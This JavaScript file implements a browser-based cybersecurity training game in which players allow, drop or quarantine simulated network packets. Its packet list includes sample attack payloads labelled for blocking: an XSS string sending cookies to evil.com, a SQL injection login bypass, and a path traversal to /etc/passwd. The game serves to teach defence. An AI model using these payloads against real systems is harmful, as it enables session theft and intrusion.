/**
 * ==========================================================================
 * PWNBOX CYBER COMMAND // TACTICAL ARCADE & MINI-GAMES ENGINE
 * Integrated Suite of 8 Interactive Cybersecurity Learning Games
 * ==========================================================================
 */

// ── 1. GLOBAL ARCADE STATE & AUDIO SYNTHESIZER ──
const ArcadeState = {
    totalXp: parseInt(localStorage.getItem('pwnbox_arcade_xp') || '0', 10),
    activeGame: 'game-packet-gatekeeper',
    audioMuted: false,
};

function addArcadeXp(points) {
    ArcadeState.totalXp += points;
    localStorage.setItem('pwnbox_arcade_xp', ArcadeState.totalXp);
    const xpDisp = document.getElementById('totalXpDisplay');
    if (xpDisp) {
        xpDisp.textContent = `TOTAL XP: ${ArcadeState.totalXp}`;
    }
}

// Retro Web Audio Synthesizer for Zero-Asset Instant Cyber SFX
const CyberAudio = {
    ctx: null,
    init() {
        if (!this.ctx) {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (AudioContext) {
                this.ctx = new AudioContext();
            }
        }
    },
    playTone(freq, type = 'sine', duration = 0.15, gainVal = 0.1) {
        if (ArcadeState.audioMuted) return;
        try {
            this.init();
            if (!this.ctx) return;
            if (this.ctx.state === 'suspended') {
                this.ctx.resume();
            }
            const osc = this.ctx.createOscillator();
            const gain = this.ctx.createGain();
            osc.type = type;
            osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
            gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + duration);
            osc.connect(gain);
            gain.connect(this.ctx.destination);
            osc.start();
            osc.stop(this.ctx.currentTime + duration);
        } catch (e) {
            // Audio Context silent fail safe
        }
    },
    success() {
        this.playTone(587.33, 'triangle', 0.1, 0.12);
        setTimeout(() => this.playTone(880, 'triangle', 0.2, 0.12), 100);
    },
    fail() {
        this.playTone(220, 'sawtooth', 0.25, 0.15);
        setTimeout(() => this.playTone(146.83, 'sawtooth', 0.35, 0.15), 120);
    },
    blip() {
        this.playTone(660, 'square', 0.08, 0.05);
    },
    alert() {
        this.playTone(440, 'sawtooth', 0.1, 0.15);
        setTimeout(() => this.playTone(330, 'sawtooth', 0.15, 0.15), 100);
    }
};

// ── 2. UNIVERSAL GAME SWITCHER ──
function switchGame(gameId) {
    CyberAudio.blip();
    ArcadeState.activeGame = gameId;

    // Update Tab Buttons
    document.querySelectorAll('.game-tab-btn').forEach(btn => {
        if (btn.getAttribute('data-target') === gameId) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });

    // Update Game Containers
    document.querySelectorAll('.game-instance-container').forEach(container => {
        if (container.id === gameId) {
            container.classList.add('active');
        } else {
            container.classList.remove('active');
        }
    });

    // Trigger Initializer if available
    if (gameId === 'game-packet-gatekeeper' && typeof initPacketGatekeeper === 'function') {
        initPacketGatekeeper();
    } else if (gameId === 'game-phish-detective' && typeof initPhishDetective === 'function') {
        initPhishDetective();
    } else if (gameId === 'game-sqli-locksmith' && typeof initSqliLocksmith === 'function') {
        initSqliLocksmith();
    } else if (gameId === 'game-cidr-block' && typeof initCidrBlock === 'function') {
        initCidrBlock();
    } else if (gameId === 'game-privesc-tower' && typeof initPrivescTower === 'function') {
        initPrivescTower();
    } else if (gameId === 'game-ransom-panic' && typeof initRansomPanic === 'function') {
        initRansomPanic();
    } else if (gameId === 'game-entropy-clash' && typeof initEntropyClash === 'function') {
        initEntropyClash();
    } else if (gameId === 'game-cipher-relic' && typeof initCipherRelic === 'function') {
        initCipherRelic();
    }
}

// ── 3. GAME 1: PACKET GATEKEEPER IMPLEMENTATION ──
const PacketGatekeeper = {
    health: 100,
    score: 0,
    streak: 0,
    level: 1,
    currentPacket: null,
    timerInterval: null,
    timeRemaining: 7.0,
    packetCounter: 1001,
    isProcessing: false,

    // Database of packet scenarios with cyber security justifications
    packetDatabase: [
        // Level 1: Basic Insecure vs Standard Protocols
        {
            level: 1,
            srcIp: '192.168.1.104',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'TLS 1.3 ENCRYPTED',
            payload: '[Encrypted Application Data: SHA256 Stream]',
            action: 'allow',
            reason: 'Standard TLS-encrypted HTTPS web session. Safe to forward.'
        },
        {
            level: 1,
            srcIp: '185.120.34.8',
            destPort: '23 (TELNET)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE (PLAINTEXT)',
            payload: 'login: admin password: password123',
            action: 'drop',
            reason: 'Telnet transmits passwords unencrypted over cleartext! Must be blocked in favor of SSH.'
        },
        {
            level: 1,
            srcIp: '10.0.0.12',
            destPort: '53 (DNS)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'PLAIN DNS',
            payload: 'Query: api.github.com A IN (Size: 42 bytes)',
            action: 'allow',
            reason: 'Standard low-volume DNS query to trusted domain.'
        },
        {
            level: 1,
            srcIp: '194.26.29.112',
            destPort: '445 (SMB)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'UNAUTHENTICATED',
            payload: 'SMBv1 Negotiate Protocol Request (EternalBlue Vector)',
            action: 'drop',
            reason: 'External WAN access to SMB Port 445 is an extreme risk (EternalBlue/WannaCry attack vector)!'
        },

        // Level 2: Scans & SYN Floods
        {
            level: 2,
            srcIp: '203.0.113.88',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE',
            payload: '[SYN Flood Burst: Missing ACK from spoofed subnet]',
            action: 'drop',
            reason: 'High frequency half-open TCP SYN packet with no handshake completion — Classic SYN Flood DoS!'
        },
        {
            level: 2,
            srcIp: '198.51.100.5',
            destPort: '22 (SSH)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'SSH-2.0-OpenSSH_8.9p1',
            payload: '[Encrypted SSH Session Key Exchange]',
            action: 'allow',
            reason: 'Valid encrypted administrative SSH session from authorized bastion range.'
        },
        {
            level: 2,
            srcIp: '45.154.255.8',
            destPort: '3389 (RDP)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'NONE',
            payload: 'RDP Credential Spray Attack: Attempt 142/5000',
            action: 'drop',
            reason: 'Public Internet RDP brute-force attack (BlueKeep target). Port 3389 must never be exposed publicly.'
        },

        // Level 3: Web Application Exploits
        {
            level: 3,
            srcIp: '185.220.101.4',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'GET /login?user=admin\'%20OR%201=1-- HTTP/1.1',
            action: 'drop',
            reason: 'Classic SQL Injection (`\' OR 1=1--`) attempting authentication bypass!'
        },
        {
            level: 3,
            srcIp: '172.16.4.19',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'POST /feedback?msg=<script>fetch("http://evil.com/"+document.cookie)</script>',
            action: 'drop',
            reason: 'Stored Cross-Site Scripting (XSS) payload attempting cookie theft.'
        },
        {
            level: 3,
            srcIp: '192.168.1.150',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'TLS 1.3',
            payload: 'GET /dashboard/metrics HTTP/2 (Valid JWT Bearer Token)',
            action: 'allow',
            reason: 'Authorized HTTPS API call with legitimate authorization header.'
        },
        {
            level: 3,
            srcIp: '194.67.210.12',
            destPort: '80 (HTTP)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK', 'PSH'],
            encryption: 'HTTP PLAINTEXT',
            payload: 'GET /view?page=../../../../etc/passwd HTTP/1.1',
            action: 'drop',
            reason: 'Path / Directory Traversal exploit attempting to read Linux sensitive password database.'
        },

        // Level 4 & 5: Advanced & Zero-Day Sandbox / Quarantine
        {
            level: 4,
            srcIp: '198.18.0.44',
            destPort: '53 (DNS)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'PLAIN DNS',
            payload: 'Query: 616263646566.c2-exfil.xyz TXT (Size: 840 bytes, Base64 Encoded)',
            action: 'quarantine',
            reason: 'Abnormally huge TXT record query with hex payload — high probability of DNS Tunneling & Data Exfiltration! Sent to Sandbox.'
        },
        {
            level: 4,
            srcIp: '10.0.5.210',
            destPort: '443 (HTTPS)',
            protocol: 'TCP',
            flags: ['TCP', 'SYN'],
            encryption: 'SELF-SIGNED / UNTRUSTED CA',
            payload: 'TLS ClientHello [Certificate Issued to: "Internal-Test-Cert-Invalid-Root"]',
            action: 'quarantine',
            reason: 'Suspicious untrusted root CA certificate on internal segment. Requires sandbox detonation before letting through.'
        },
        {
            level: 5,
            srcIp: '192.0.2.14',
            destPort: '123 (NTP)',
            protocol: 'UDP',
            flags: ['UDP'],
            encryption: 'NTP MONLIST',
            payload: 'NTP monlist query (Amplification Vector: 1:556 ratio)',
            action: 'drop',
            reason: 'NTP Monlist Reflection DDoS amplification attack vector! Dropped immediately.'
        },
        {
            level: 5,
            srcIp: '192.168.1.20',
            destPort: '22 (SSH)',
            protocol: 'TCP',
            flags: ['TCP', 'ACK'],
            encryption: 'SSH-2.0',
            payload: 'Encrypted payload [Unusual binary signature: 0xDEADBEEF in banner]',
            action: 'quarantine',
            reason: 'Anomalous SSH implementation banner matches known backdoor implant. Quarantined for reverse engineering.'
        }
    ]
};

function initPacketGatekeeper() {
    PacketGatekeeper.health = 100;
    PacketGatekeeper.score = 0;
    PacketGatekeeper.streak = 0;
    PacketGatekeeper.level = 1;
    PacketGatekeeper.isProcessing = false;

    updatePgUI();
    const modal = document.getElementById('pgModal');
    if (modal) modal.style.display = 'none';

    addPgLog('Gatekeeper IDS online. Perimeter filtering initiated.', 'success');
    spawnNextPacket();
}

function updatePgUI() {
    const healthEl = document.getElementById('pgHealthVal');
    const scoreEl = document.getElementById('pgScoreVal');
    const streakEl = document.getElementById('pgStreakVal');
    const levelEl = document.getElementById('pgLevelVal');

    if (healthEl) {
        healthEl.textContent = `${PacketGatekeeper.health}%`;
        healthEl.style.color = PacketGatekeeper.health > 50 ? 'var(--accent-green)' : (PacketGatekeeper.health > 25 ? 'var(--accent-yellow)' : 'var(--accent-red)');
    }
    if (scoreEl) scoreEl.textContent = PacketGatekeeper.score;
    if (streakEl) streakEl.textContent = `${Math.min(PacketGatekeeper.streak, 5)}x`;
    if (levelEl) levelEl.textContent = `${PacketGatekeeper.level} / 5`;
}

function spawnNextPacket() {
    clearInterval(PacketGatekeeper.timerInterval);
    PacketGatekeeper.isProcessing = false;

    // Filter available packets based on current level
    const candidates = PacketGatekeeper.packetDatabase.filter(p => p.level <= PacketGatekeeper.level);
    const chosen = candidates[Math.floor(Math.random() * candidates.length)];
    PacketGatekeeper.currentPacket = chosen;
    PacketGatekeeper.packetCounter++;

    // Reset card animation classes
    const card = document.getElementById('pgPacketCard');
    if (card) {
        card.className = 'pg-packet-card';
    }

    // Populate Fields
    document.getElementById('pgPktId').textContent = `PACKET #${PacketGatekeeper.packetCounter}`;
    document.getElementById('pgSrcIp').textContent = chosen.srcIp;
    document.getElementById('pgDestPort').textContent = chosen.destPort;
    document.getElementById('pgEncryption').textContent = chosen.encryption;
    document.getElementById('pgPayload').textContent = chosen.payload;

    // Flags
    const flagsBox = document.getElementById('pgFlagsContainer');
    if (flagsBox) {
        flagsBox.innerHTML = chosen.flags.map(f => `<span class="flag-chip active-flag">${f}</span>`).join('');
    }

    // Dynamic Directive Hint
    const directiveEl = document.getElementById('pgRuleDirective');
    if (directiveEl) {
        if (PacketGatekeeper.level === 1) {
            directiveEl.textContent = 'DIRECTIVE (LVL 1): Allow secure HTTPS/DNS. DROP plaintext Telnet (23) & SMB (445).';
        } else if (PacketGatekeeper.level === 2) {
            directiveEl.textContent = 'DIRECTIVE (LVL 2): Guard against SYN Floods & public RDP (3389) brute-forcing.';
        } else if (PacketGatekeeper.level === 3) {
            directiveEl.textContent = 'DIRECTIVE (LVL 3): DPI Active. Detect SQLi, XSS, & Path Traversal in HTTP payloads.';
        } else {
            directiveEl.textContent = 'DIRECTIVE (LVL 4+): Advanced Ops. Sandbox DNS Tunneling & suspicious certs to Quarantine.';
        }
    }

    // Start TTL Countdown
    const baseTime = Math.max(3.5, 7.5 - (PacketGatekeeper.level * 0.7));
    PacketGatekeeper.timeRemaining = baseTime;
    const timerEl = document.getElementById('pgPacketTimer');

    PacketGatekeeper.timerInterval = setInterval(() => {
        PacketGatekeeper.timeRemaining -= 0.1;
        if (timerEl) {
            timerEl.textContent = `TTL: ${Math.max(0, PacketGatekeeper.timeRemaining).toFixed(1)}s`;
        }

        if (PacketGatekeeper.timeRemaining <= 0) {
            clearInterval(PacketGatekeeper.timerInterval);
            handlePgTimeout();
        }
    }, 100);
}

function handlePgAction(playerAction) {
    if (PacketGatekeeper.isProcessing || !PacketGatekeeper.currentPacket) return;
    PacketGatekeeper.isProcessing = true;
    clearInterval(PacketGatekeeper.timerInterval);

    const pkt = PacketGatekeeper.currentPacket;
    const card = document.getElementById('pgPacketCard');

    // Visual animation based on action
    if (card) {
        card.classList.add(`anim-${playerAction}`);
    }

    const isCorrect = (playerAction === pkt.action);

    if (isCorrect) {
        CyberAudio.success();
        PacketGatekeeper.score += 100 * Math.max(1, PacketGatekeeper.streak);
        PacketGatekeeper.streak++;
        addArcadeXp(25);

        // Health recovery
        PacketGatekeeper.health = Math.min(100, PacketGatekeeper.health + 5);

        // Level Up Threshold
        if (PacketGatekeeper.score >= 500 && PacketGatekeeper.level === 1) PacketGatekeeper.level = 2;
        if (PacketGatekeeper.score >= 1200 && PacketGatekeeper.level === 2) PacketGatekeeper.level = 3;
        if (PacketGatekeeper.score >= 2200 && PacketGatekeeper.level === 3) PacketGatekeeper.level = 4;
        if (PacketGatekeeper.score >= 3500 && PacketGatekeeper.level === 4) PacketGatekeeper.level = 5;

        addPgLog(`[CORRECT] ${playerAction.toUpperCase()} on ${pkt.destPort} from ${pkt.srcIp}. ${pkt.reason}`, 'success');
    } else {
        CyberAudio.fail();
        PacketGatekeeper.streak = 0;
        PacketGatekeeper.health -= 25;
        addPgLog(`[MISTAKE!] Action was ${playerAction.toUpperCase()} but required ${pkt.action.toUpperCase()}! ${pkt.reason}`, 'breach');
    }

    updatePgUI();

    // Check Loss Condition
    if (PacketGatekeeper.health <= 0) {
        setTimeout(triggerPgGameOver, 400);
    } else {
        setTimeout(spawnNextPacket, 400);
    }
}

function handlePgTimeout() {
    if (PacketGatekeeper.isProcessing) return;
    PacketGatekeeper.isProcessing = true;
    CyberAudio.alert();
    PacketGatekeeper.health -= 20;
    PacketGatekeeper.streak = 0;
    addPgLog(`[TIMEOUT] Inspection window expired for packet to ${PacketGatekeeper.currentPacket.destPort}. Buffer overflow penalty!`, 'warning');
    updatePgUI();

    if (PacketGatekeeper.health <= 0) {
        triggerPgGameOver();
    } else {
        setTimeout(spawnNextPacket, 400);
    }
}

function addPgLog(msg, type = 'info') {
    const feed = document.getElementById('pgLogFeed');
    if (!feed) return;
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    const timestamp = new Date().toTimeString().split(' ')[0];
    entry.innerHTML = `<strong>[${timestamp}]</strong> ${msg}`;
    feed.prepend(entry);

    // Limit log size to 15 entries
    while (feed.children.length > 15) {
        feed.removeChild(feed.lastChild);
    }
}

function triggerPgGameOver() {
    clearInterval(PacketGatekeeper.timerInterval);
    CyberAudio.fail();
    const modal = document.getElementById('pgModal');
    if (modal) {
        document.getElementById('pgModalTitle').textContent = 'GATEWAY INTEGRITY COMPROMISED';
        document.getElementById('pgModalMsg').textContent = `The firewall failed under threat pressure. You filtered ${PacketGatekeeper.score / 100} packets and attained Level ${PacketGatekeeper.level}.`;
        modal.style.display = 'flex';
    }
}

// ── 4. KEYBOARD SHORTCUTS FOR ARCADE ──
document.addEventListener('keydown', (e) => {
    // Single-key shortcuts only if not in an input
    const activeEl = document.activeElement;
    if (activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA')) return;

    if (ArcadeState.activeGame === 'game-packet-gatekeeper') {
        const k = e.key.toLowerCase();
        if (k === 'a' || e.key === 'ArrowLeft') {
            e.preventDefault();
            handlePgAction('allow');
        } else if (k === 'd' || e.key === 'ArrowRight') {
            e.preventDefault();
            handlePgAction('drop');
        } else if (k === 's' || e.key === 'ArrowDown') {
            e.preventDefault();
            handlePgAction('quarantine');
        }
    }
});

// Auto-boot on load
window.addEventListener('DOMContentLoaded', () => {
    addArcadeXp(0);
    initPacketGatekeeper();
});
